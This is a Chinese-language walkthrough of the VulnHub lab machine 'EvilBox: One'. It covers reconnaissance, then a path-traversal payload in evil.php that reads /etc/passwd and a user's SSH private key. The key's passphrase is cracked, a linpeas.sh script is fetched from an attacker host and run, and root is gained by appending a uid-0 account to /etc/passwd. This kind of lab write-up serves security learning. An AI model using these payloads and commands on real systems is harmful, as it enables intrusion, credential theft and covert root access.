## 复盘*

## 靶机地址

[EvilBox: One ~ VulnHub](https://www.vulnhub.com/entry/evilbox-one,736/)

![image-20250325134523992](assets/image-20250325134523992.png)



## 信息收集

### nmap扫描

#### 准备阶段

```
mkdir nmapscan
```

![image-20250325134628114](assets/image-20250325134628114.png)

创建文件夹用来存放nmap扫描结果



#### 主机探测

```
nmap -sn 192.168.1.0/24
```

![image-20250325134548967](assets/image-20250325134548967.png)

确定靶机ip：

192.168.1.6



#### 端口扫描

```
nmap -p- --min-rate 10000 -sT 192.168.1.6 -oA ./nmapscan/ports
```

![image-20250325134735725](assets/image-20250325134735725.png)开放了：

- 22 ssh
- 80 http



#### 提取端口信息

```
ports
```

![image-20250325134753249](assets/image-20250325134753249.png)



#### 详细结果扫描

```
nmap -sV -sC -O -p 22,80 192.168.1.6 -oA ./nmapscan/detail
```

![image-20250325134837646](assets/image-20250325134837646.png)

分析：

- 22 ssh OpenSSH 7.9p1 
- 80  http Apache httpd 2.4.38



### 80端口

#### 访问192.168.1.6

![image-20250325134945249](assets/image-20250325134945249.png)

apache主页

查看源码无内容



#### dirsearch目录扫描

```
dirsearch -u http://192.168.1.6
```

![image-20250325135105041](assets/image-20250325135105041.png)

![image-20250325135120462](assets/image-20250325135120462.png)

得到：

- robots.txt
- secret



#### 访问robots.txt

![image-20250325135147055](assets/image-20250325135147055.png)

可能是用户名



#### 访问secret

![image-20250325135217574](assets/image-20250325135217574.png)

无内容



#### 尝试dirsearch目录扫描

```
dirsearch -u http://192.168.1.6/secret/
```

![image-20250325135311989](assets/image-20250325135311989.png)

无结果



#### 利用gobuster进行目录扫描

```
gobuster dir -w /home/ra1n3/dic/Dir/directory-list-2.3-medium.txt -x txt,php -u http://192.168.1.6/secret/
```

![image-20250325135351965](assets/image-20250325135351965.png)

存在evil.php



#### 访问evil.php

![image-20250325135414483](assets/image-20250325135414483.png)

同样无内容

判断是木马文件

```
evil：邪恶
```





#### 利用wfuzz爆破参数

```
wfuzz -w /home/ra1n3/dic/Common/common.txt -u http://192.168.1.6/secret/evil.php?FUZZ=../../../../../../../../../../../../../etc/passwd --hh 0
```

![image-20250325135636375](assets/image-20250325135636375.png)

得到参数：command



#### 访问http://192.168.1.6/secret/evil.php?command=../../../../../../../../../../../../../etc/passw

![image-20250325135715132](assets/image-20250325135715132.png)

得到用户信息：

- mowree



#### 尝试读取其私钥文件

访问

[192.168.1.6/secret/evil.php?command=../../../../../../../../../../../../../home/mowree/.ssh/id_rsa](view-source:http://192.168.1.6/secret/evil.php?command=../../../../../../../../../../../../../home/mowree/.ssh/id_rsa)

![image-20250325135816446](assets/image-20250325135816446.png)



#### wget保存

```
wget 192.168.1.6/secret/evil.php?command=../../../../../../../../../../../../../home/mowree/.ssh/id_rsa -O id_rsa
cat id_rsa
```

![image-20250325140014729](assets/image-20250325140014729.png)



### 22端口

#### 尝试ssh登录

```
ssh mowree@192.168.1.6 -i id_rsa
```

![image-20250325140107776](assets/image-20250325140107776.png)

需要密码



#### 利用RSAcrack爆破

```
RSAcrack -w /home/ra1n3/dic/Passwd/rockyou.txt -k id_rsa
```

![image-20250325140204210](assets/image-20250325140204210.png)

得到密码

- unicorn



#### ssh登录

![image-20250325140239068](assets/image-20250325140239068.png)



## 提权

### 得到第一个flag

```
ls
cat user.txt
```

![image-20250325140306391](assets/image-20250325140306391.png)



### 执行sudo -l

```
sudo -l
```

![image-20250325140419255](assets/image-20250325140419255.png)

无sudo



### suid文件查找

```
find / -perm -4000 2>/dev/null
```

![image-20250325140409643](assets/image-20250325140409643.png)



### 上传linepas.sh

```
wget 192.168.1.3/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![image-20250325140447863](assets/image-20250325140447863.png)

![image-20250325140538867](assets/image-20250325140538867.png)

/etc/passwd文件可写



### 利用openssl生成密码

```
openssl passwd 123
```

![image-20250325141006560](assets/image-20250325141006560.png)



### 追加root用户

```
echo 'rain:$1$7.Wj0zOv$mHTwgjXMJjWzxIvu1FsVZ/:0:0:root:/root:/bin/bash'>>/etc/passwd
su rain
```

![image-20250325141227831](assets/image-20250325141227831.png)



### 得到第二个flag

```
cd /root
ls
cat root.txt
```

![image-20250325141254988](assets/image-20250325141254988.png)
